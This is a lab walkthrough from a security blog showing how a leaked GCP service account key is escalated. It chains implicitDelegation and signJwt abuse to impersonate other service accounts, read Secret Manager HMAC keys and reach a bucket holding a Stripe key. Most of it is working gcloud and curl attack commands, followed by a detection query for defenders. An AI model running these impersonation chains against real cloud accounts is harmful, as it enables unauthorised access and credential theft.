---
title: Pivot Through Service Accounts using Dangerous Permissions
description: Pivot Through Service Accounts using Dangerous Permissions 
image:
  path: gcp.png
categories:
- Pwned Labs
- GCP
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/gcp/
tags:
- pwnedlabs
- gcp
- cloud
---
# Scenario
We are on a purple team engagement for Gigantic Retail and have have identified an GCP service account key file in an NTFS share. Your mission is to pivot to the cloud and increase our access in GCP, and ultimately help to close down any identified attack paths.

# Walkthrough
We are given user-created service account key file `gr-proj-4-a9d795d9d5ef.json`
```
└─$ cat gr-proj-4-a9d795d9d5ef.json                       
{
  "type": "service_account",
  "project_id": "gr-proj-4",
  "private_key_id": "a9d795d9d5ef18747bec230e9b70d5983fbd1b15",
  "private_key": "<REDACTED>",
  "client_email": "staging@gr-proj-4.iam.gserviceaccount.com",
  "client_id": "106541806044355998106",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/staging%40gr-proj-4.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

```

A user-created service account is a special type of identity used by applications or compute workloads (such as Compute Engine VMs or GKE pods) to authenticate to cloud services. It aligns with a service principal in Azure and an IAM role in AWS when those identities are attached to resources like EC2 or Lambda.

| Category                | GCP                          | Azure                            | AWS                              | Purpose / Use Case                                                                                |
| ----------------------- | ---------------------------- | -------------------------------- | -------------------------------- | ------------------------------------------------------------------------------------------------- |
| Workload Identity       | Service Account              | Service Principal                | IAM Role (for EC2, Lambda, etc.) | Identity for apps/services to authenticate to APIs. Attached to code, VMs, GKE, etc.              |
| User-Managed Identity   | User-created Service Account | User-assigned Managed Identity   | IAM Role + Instance Profile      | Custom identity created and attached to compute resources.                                        |
| System-Managed Identity | Default Service Account      | System-assigned Managed Identity | Service-linked Role              | Auto-managed identity created by the platform for the service/resource.                           |
| Permission Set / Policy | IAM Role (permission set)    | Role Definition                  | IAM Policy / Role                | Defines what the principal can do (e.g., `roles/storage.admin`, `Storage Blob Data Contributor`). |

A good way of achieving situational awareness in GCP in an unknown execution context is to brute force IAM permissions. We can use this fork of the tool [gcp-permissions-checker](https://github.com/exe-cut3/gcp-permissions-checker). The tool uses [testIamPermissions](https://cloud.google.com/iam/docs/reference/rest/v1/projects.serviceAccounts/testIamPermissions). However the tool didn't find anything
```
└─$ ./gcp_perm_checker.py ~/pwnedlabs/gcp/gr-proj-4-a9d795d9d5ef.json 
Service account credentials loaded successfully.
Authenticated successfully.
Accessible permissions: []
Scanning: 100%|████████████████████████████████████████████| Elapsed Time: 08:11
```

Let's do it manually
```
└─$ gcloud auth activate-service-account --key-file=gr-proj-4-a9d795d9d5ef.json
Activated service account credentials for: [staging@gr-proj-4.iam.gserviceaccount.com]
```

We can't list other projects that may exist. But it doesn't mean that we don't have permissions on other projects.
```
└─$ gcloud projects list                                
Listed 0 items.
```

Seems like we can get the IAM policy for the project `gr-proj-4` 
```
└─$ gcloud projects get-iam-policy gr-proj-4
auditConfigs:
- auditLogConfigs:
  - logType: ADMIN_READ
  - logType: DATA_READ
  - logType: DATA_WRITE
  service: iam.googleapis.com
bindings:
- members:
  - serviceAccount:payments@gr-proj-4.iam.gserviceaccount.com
  role: projects/gr-proj-4/roles/PaymentsStorage
- members:
  - serviceAccount:staging@gr-proj-4.iam.gserviceaccount.com
  role: projects/gr-proj-4/roles/Staging2
- members:
  - serviceAccount:analytics@gr-proj-4.iam.gserviceaccount.com
  role: roles/analyticshub.viewer
- members:
  - serviceAccount:analytics@gr-proj-4.iam.gserviceaccount.com
  role: roles/bigquery.dataViewer
- members:
  - serviceAccount:sql-424@gr-proj-4.iam.gserviceaccount.com
  role: roles/cloudsql.viewer
- members:
  - serviceAccount:service-771792750903@compute-system.iam.gserviceaccount.com
  role: roles/compute.serviceAgent
- members:
  - serviceAccount:platform-middleware@gr-proj-4.iam.gserviceaccount.com
  role: roles/compute.viewer
- members:
  - serviceAccount:771792750903-compute@developer.gserviceaccount.com
  - serviceAccount:771792750903@cloudservices.gserviceaccount.com
  role: roles/editor
- members:
  - user:ian@pwnedlabs.io
  role: roles/owner
- members:
  - serviceAccount:platform-middleware@gr-proj-4.iam.gserviceaccount.com
  role: roles/run.invoker
- members:
  - serviceAccount:platform-middleware@gr-proj-4.iam.gserviceaccount.com
  role: roles/secretmanager.viewer
- members:
  - serviceAccount:payments@gr-proj-4.iam.gserviceaccount.com
  role: roles/storage.bucketViewer
- members:
  - serviceAccount:payments@gr-proj-4.iam.gserviceaccount.com
  role: roles/storage.objectViewer
etag: BwY0a20Zalg=
version: 1

```
IAM policy provides useful information:
- `Role bindings`: Lists which members (users, groups, service accounts, etc.) are assigned which roles in the project.
- `Audit logging configuration`: If configured, it includes any `auditConfigs` (like enabling `DATA_READ`, `DATA_WRITE` logs for services like `iam.googleapis.com`).
- `Custom roles`: If custom roles are used, their full role name (e.g., `projects/gr-proj-4/roles/CustomRole`) will appear.

We see `Staging2` role assigned to current account, but we can't get its' details
```
└─$ gcloud iam roles describe Staging2 --project gr-proj-4
ERROR: (gcloud.iam.roles.describe) PERMISSION_DENIED: You don't have permission to get the role at projects/gr-proj-4/roles/Staging2. This command is authenticated as staging@gr-proj-4.iam.gserviceaccount.com which is the active account specified by the [core/account] property.
- '@type': type.googleapis.com/google.rpc.ErrorInfo
  domain: iam.googleapis.com
  metadata:
    permission: iam.roles.get
    resource: projects/gr-proj-4/roles/Staging2
  reason: IAM_PERMISSION_DENIED

```
We also see other service accounts that exist in the project. It's worth testing if we are able to move laterally to them. First, let's extract the GCP service account email addresses.
```
gcloud projects get-iam-policy gr-proj-4 \
  --format="flattened(bindings[].members)" \
  | grep 'serviceAccount:' \
  | awk -F'serviceAccount:' '{print $2}' \
  | sort -u > serviceaccounts.txt
```
```
└─$ cat serviceaccounts.txt 
771792750903@cloudservices.gserviceaccount.com
771792750903-compute@developer.gserviceaccount.com
analytics@gr-proj-4.iam.gserviceaccount.com
payments@gr-proj-4.iam.gserviceaccount.com
platform-middleware@gr-proj-4.iam.gserviceaccount.com
service-771792750903@compute-system.iam.gserviceaccount.com
sql-424@gr-proj-4.iam.gserviceaccount.com
staging@gr-proj-4.iam.gserviceaccount.com
```

Use the `testIamPermissions` method to identify if we have any potentially dangerous permissions on other service accounts. In terms of GCP IAM, we're checking whether any policy bindings grants our principal permissions like `actAs` or `signJwt` on service accounts, which could allow privilege escalation or lateral movement.
```
└─$ for sa in $(cat serviceaccounts.txt); do
echo "[*] checking $sa"
  curl -s -X POST \
    -H "Authorization: Bearer $(gcloud auth print-access-token)" \
    -H "Content-Type: application/json" \
    -d '{
          "permissions": [
            "iam.serviceAccounts.getAccessToken",
            "iam.serviceAccounts.signJwt",
            "iam.serviceAccounts.implicitDelegation",
            "iam.serviceAccounts.actAs"
          ]
        }' \
    "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$sa\:testIamPermissions"
done
[*] checking 771792750903@cloudservices.gserviceaccount.com
{
  "error": {
    "code": 404,
    "message": "Unknown service account",
    "status": "NOT_FOUND"
  }
}
[*] checking 771792750903-compute@developer.gserviceaccount.com
{}
[*] checking analytics@gr-proj-4.iam.gserviceaccount.com
{}
[*] checking payments@gr-proj-4.iam.gserviceaccount.com
{}
[*] checking platform-middleware@gr-proj-4.iam.gserviceaccount.com
{}
[*] checking service-771792750903@compute-system.iam.gserviceaccount.com
{}
[*] checking sql-424@gr-proj-4.iam.gserviceaccount.com
{
  "permissions": [
    "iam.serviceAccounts.implicitDelegation"
  ]
}
[*] checking staging@gr-proj-4.iam.gserviceaccount.com
{}
```

We have `implicitDelegation`,  which allows the source service account to request that the target service account perform actions on its behalf. 
- However, this permission alone doesn't grant full impersonation or execution context. 
- It simply lets the source delegate certain operations. 
- For example, if the target service account also has permissions to generate access tokens or sign data (like `iam.serviceAccounts.getAccessToken` or `iam.serviceAccounts.signBlob`), then the source could potentially leverage that to perform further actions. 
- But without those additional permissions, implicit delegation alone won't let fully act as the target.

Let's see if any of the other service accounts (including `sql-424`) allow us to generate an access token via impersonation through the delegate chain
```
└─$ for sa in \
  analytics@gr-proj-4.iam.gserviceaccount.com \
  payments@gr-proj-4.iam.gserviceaccount.com \
  platform-middleware@gr-proj-4.iam.gserviceaccount.com \
  sql-424@gr-proj-4.iam.gserviceaccount.com
do
  curl -s -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${sa}:generateAccessToken?access_token=$(gcloud auth print-access-token)" \
    -H "Content-Type: application/json" \
    --data '{
      "delegates": ["projects/-/serviceAccounts/sql-424@gr-proj-4.iam.gserviceaccount.com"],
      "scope": ["https://www.googleapis.com/auth/cloud-platform"]
    }' | jq .
done
{
  "accessToken": "<REDACTED>",                                                                                                                                        
  "expireTime": "2025-09-07T18:23:06Z"
}
{
  "error": {
    "code": 403,
    "message": "Permission 'iam.serviceAccounts.getAccessToken' denied on resource (or it may not exist).",
    "status": "PERMISSION_DENIED",
    "details": [
<SNIP>

```

We're able to leverage the implicit delegation on `sql-424@gr-proj-4.iam.gserviceaccount.com` to generate an access token for `analytics@gr-proj-4.iam.gserviceaccount.com` and move laterally to this new execution context. 

Set the token to a variable e.g. analyticstoken="<access_token>" and also save it to a file e.g. token.txt .

Let's run `gcp_perm_checker.py` again. 
```
└─$ ./gcp_perm_checker.py -Token $analyticstoken -ProjectID gr-proj-4
Using provided access token for authentication.
Authenticated successfully.
Accessible permissions: ['resourcemanager.projects.get']
Found permissions: ['analyticshub.dataExchanges.get', 'analyticshub.dataExchanges.getIamPolicy', 'analyticshub.dataExchanges.list', 'analyticshub.listings.get', 'analyticshub.listings.getIamPolicy', 'analyticshub.listings.list']
Found permissions: ['bigquery.datasets.get']                                    
Found permissions: ['bigquery.datasets.getIamPolicy', 'bigquery.models.export', 'bigquery.models.getData', 'bigquery.models.getMetadata', 'bigquery.models.list']
Found permissions: ['bigquery.routines.get', 'bigquery.routines.list']          
Found permissions: ['bigquery.tables.createSnapshot', 'bigquery.tables.export', 'bigquery.tables.get', 'bigquery.tables.getData', 'bigquery.tables.getIamPolicy', 'bigquery.tables.list', 'bigquery.tables.replicateData']
Found permissions: ['dataplex.datascans.get', 'dataplex.datascans.getData', 'dataplex.datascans.getIamPolicy', 'dataplex.datascans.list']
Scanning: 100%|████████████████████████████████████████████| Elapsed Time: 07:17
```


It returns permissions consistent with the service account's bindings to the `roles/analyticshub.viewer` and `roles/bigquery.dataViewer` roles. However, enumeration doesn't reveal any resources. Let's see if this account has been given access to perform actions on other service accounts.
```
└─$ for sa in $(cat serviceaccounts.txt); do
echo "[*] checking $sa"
  curl -s -X POST \
    -H "Authorization: Bearer $analyticstoken" \
    -H "Content-Type: application/json" \
    -d '{
          "permissions": [
            "iam.serviceAccounts.getAccessToken",
            "iam.serviceAccounts.signJwt",
            "iam.serviceAccounts.implicitDelegation",
            "iam.serviceAccounts.actAs"
          ]
        }' \
    "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$sa\:testIamPermissions"
done
[*] checking 771792750903@cloudservices.gserviceaccount.com
{
  "error": {
    "code": 404,
    "message": "Unknown service account",
    "status": "NOT_FOUND"
  }
}
[*] checking 771792750903-compute@developer.gserviceaccount.com
{}
[*] checking analytics@gr-proj-4.iam.gserviceaccount.com
{}
[*] checking payments@gr-proj-4.iam.gserviceaccount.com
{}
[*] checking platform-middleware@gr-proj-4.iam.gserviceaccount.com
{
  "permissions": [
    "iam.serviceAccounts.signJwt"
  ]
}
[*] checking service-771792750903@compute-system.iam.gserviceaccount.com
{}
[*] checking sql-424@gr-proj-4.iam.gserviceaccount.com
{}
[*] checking staging@gr-proj-4.iam.gserviceaccount.com
{}
```

Seems like `analytics@gr-proj-4.iam.gserviceaccount.com` has the `iam.serviceAccounts.signJwt` permission on the `platform-middleware@gr-proj-4.iam.gserviceaccount.com`. This means `analytics` has the ability to sign JWTs as `platform-middleware`.

To abuse the `iam.serviceAccounts.signJwt` permission:
- Create a JWT that claims to be from the target service account and use the IAM Credentials API to have Google sign it for us. 
- Once we have the signed JWT, we’ll exchange it at the OAuth token endpoint to get an access token that lets us act as that service account. 

First, we need to create the JWT claim set, we get the required format from the developer [documentation](https://developers.google.com/identity/protocols/oauth2/service-account#authorizingrequests).
```
export IAT=$(date +%s)
export EXP=$(($IAT + 3600))

cat > claims.json <<EOF
{
  "iss": "platform-middleware@gr-proj-4.iam.gserviceaccount.com",
  "scope": "https://www.googleapis.com/auth/cloud-platform",
  "aud": "https://oauth2.googleapis.com/token",
  "exp": $EXP,
  "iat": $IAT
}
EOF
```
We can use the `gcloud iam service-accounts sign-jwt` command with the `analytics` service account's access token (`token.txt`) to have Google sign a custom JWT as platform-middleware.
```
└─$ gcloud iam service-accounts sign-jwt claims.json signed-jwt.txt --iam-account=platform-middleware@gr-proj-4.iam.gserviceaccount.com --access-token-file token.txt 
signed jwt [claims.json] as [signed-jwt.txt] for [platform-middleware@gr-proj-4.iam.gserviceaccount.com] using key [edcfe28fd8b7499de9ba35ab391c79d86a5048cd]
```

Then we can `curl` to exchange the signed JWT at the OAuth 2.0 token endpoint for an access token representing the target service account. Save the access token to a file (`token.txt`). 
```
└─$ curl -s -X POST https://oauth2.googleapis.com/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$(cat signed-jwt.txt)" \
  | jq -r .access_token
ya29.c.<REDACTED>
```
We know that the `platform-middleware` service account is granted the `roles/secretmanager.viewer` role
```
└─$ gcloud projects get-iam-policy gr-proj-4
auditConfigs:
- auditLogConfigs:
  - logType: ADMIN_READ
  - logType: DATA_READ
  - logType: DATA_WRITE
  service: iam.googleapis.com
<SNIP>
- members:
  - serviceAccount:platform-middleware@gr-proj-4.iam.gserviceaccount.com
  role: roles/secretmanager.viewer
<SNIP>
```
Let's list available Secret Manager secrets using access token of `platform-middleware` service account
```
└─$ gcloud secrets list --access-token-file token.txt --project gr-proj-4
NAME              CREATED              REPLICATION_POLICY  LOCATIONS
payments          2025-04-02T14:36:59  automatic           -
payments-storage  2025-04-02T16:25:57  automatic           -

```

We see two secrets named `payments` and `payments-storage`. Let's check out `payments`. We get a result which seems to be [Google HMAC keys](https://cloud.google.com/storage/docs/authentication/hmackeys). An HMAC key is a type of access credential associated with a service account that allows it to authenticate and interact with Google Cloud Storage
```
└─$ gcloud secrets versions access latest --secret=payments --project=gr-proj-4 --access-token-file token.txt
<REDACTED>
<REDACTED>  
```
The `payments-storage secret` contains the name `gr-stripe` which could be a password, username, or a bucket name
```
└─$ gcloud secrets versions access latest --secret=payments-storage --project=gr-proj-4 --access-token-file token.txt
gr-stripe    
```

HMAC keys can be used with `gsutil`, a tool for interacting with Google Cloud Storage.
```
└─$ gsutil config -a
This command will configure HMAC credentials, but gsutil will use
OAuth2 credentials from the Cloud SDK by default. To make sure the
HMAC credentials are used, run: "gcloud config set
pass_credentials_to_gsutil false".

This command will create a boto config file at /home/kali/.boto
containing your credentials, based on your responses to the following
questions.
What is your google access key ID? <REDACTED>
What is your google secret access key? <REDACTED>

Boto config file "/home/kali/.boto" created. If you need to use a
proxy to access the Internet please see the instructions in that file.
                                                                      
```
> It's worth noting that HMAC keys are stored in plaintext in the `~/.boto` file, so make sure to check for it during post-exploitation on a compromised VM.
{: .prompt-info }

Running `gsutil -ls` results in an error stating that the `staging` service account doesn't have access to list buckets
```
└─$ gsutil ls
AccessDeniedException: 403 AccessDenied
<?xml version='1.0' encoding='UTF-8'?><Error><Code>AccessDenied</Code><Message>Access denied.</Message><Details>staging@gr-proj-4.iam.gserviceaccount.com does not have storage.buckets.list access to the Google Cloud project. Permission 'storage.buckets.list' denied on resource (or it may not exist).</Details></Error>

```

When we set the HMAC keys, `gsutil` mentioned: `This command will configure HMAC credentials, but gsutil will use OAuth2 credentials from the Cloud SDK by default. To make sure the HMAC credentials are used, run: gcloud config set pass_credentials_to_gsutil false`. So by default gsutil will attempt to use the credentials set using `gcloud`, which is the staging service account.
```
└─$ gcloud config set pass_credentials_to_gsutil false
Updated property [core/pass_credentials_to_gsutil].
```
After running` gcloud config set pass_credentials_to_gsutil false`, the execution context has changed to the payments service account. However, this account also doesn't have permission to list buckets. 
```
─$ gsutil ls                                         
AccessDeniedException: 403 AccessDenied
<?xml version='1.0' encoding='UTF-8'?><Error><Code>AccessDenied</Code><Message>Access denied.</Message><Details>payments@gr-proj-4.iam.gserviceaccount.com does not have storage.buckets.list access to the Google Cloud project. Permission 'storage.buckets.list' denied on resource (or it may not exist).</Details></Error>
```
But attempting to recursively list the bucket named `gr-stripe` is successful.
```
└─$ gsutil ls -r gs://gr-stripe                       
gs://gr-stripe/flag.txt
gs://gr-stripe/transfer/:
gs://gr-stripe/transfer/
gs://gr-stripe/transfer/stripe-fetch.js

```

We see a file named `stripe-fetch.js` that seems to contain a Stripe API key
```
└─$ gsutil cp gs://gr-stripe/transfer/stripe-fetch.js -
const axios = require('axios');
const dotenv = require('dotenv');
dotenv.config({ path: './.env' });

const SECRET_KEY = '<REDACTED>';
const URL = 'https://api.stripe.com/v1/products/';

axios.get(URL, {
    headers: {
        'Authorization': `Bearer ${SECRET_KEY}`,
        'Content-Type': 'application/x-www-form-urlencoded'
    }
})
.then(response => { 
    console.log(response.data);
})
.catch(error => {
    console.log(error);
}); 
```
# Defense
Based on lab's [Defense](https://pwnedlabs.io/labs/pivot-through-service-accounts-using-dangerous-permissions) section.


Use GCP Cloud Logging and Logs Explorer to detect abuse of dangerous permissions that allow lateral movement between service accounts.
```
resource.type="service_account"
logName="projects/gr-proj-4/logs/cloudaudit.googleapis.com%2Fdata_access"
protoPayload.methodName=(
  "GenerateAccessToken" OR
  "signJwt" OR
  "signBlob" OR
  "SetIamPolicy" OR
  "UploadServiceAccountKey" OR
  "CreateServiceAccountKey"
)
```

![](pivot-through-service-accounts-using-dangerous-permissions-1.png)

Each event includes an `Explain this log` entry button to help defenders quickly understand the context and decide whether the behavior is expected in their environment.

![](pivot-through-service-accounts-using-dangerous-permissions-2.png)


Gemini states: 
- "The log entry indicates that the service account `staging@gr-proj-4.iam.gserviceaccount.com` successfully generated an access token on behalf of service account `analytics@gr-proj-4.iam.gserviceaccount.com` , which was originally requested by service account `sql-424@gr-proj-4.iam.gserviceaccount.com`. This event signifies a successful service account impersonation."

![](pivot-through-service-accounts-using-dangerous-permissions-3.png)

When analyzing audit logs, one of the key fields to look at is the `aud` (audience) claim in OAuth2 access tokens. 
  - In GCP, this can help determine how the access token was acquired, revealing the tool or method that was used to make the request. 
  - These contextual clues can help piece together the steps that the attacker performed. 
  - For example, `aud: 32555940559.apps.googleusercontent.com` is the OAuth2 client ID for the Google Cloud SDK (gcloud CLI).

It’s also worth mentioning that even though by compromising just one service account, we were able to pivot into the execution context of four others by abusing dangerous permissions.

Just because we’ve identified certain permissions in the project-level IAM policy bindings, it doesn't show the full picture: 
  - Additional permissions may be granted at the resource level - such as on individual service accounts, buckets, or Pub/Sub topics - which can enable lateral or vertical movement even if the project-level bindings appear restrictive. 
  - These more granular bindings can be overlooked but can be just as impactful in an attack path.
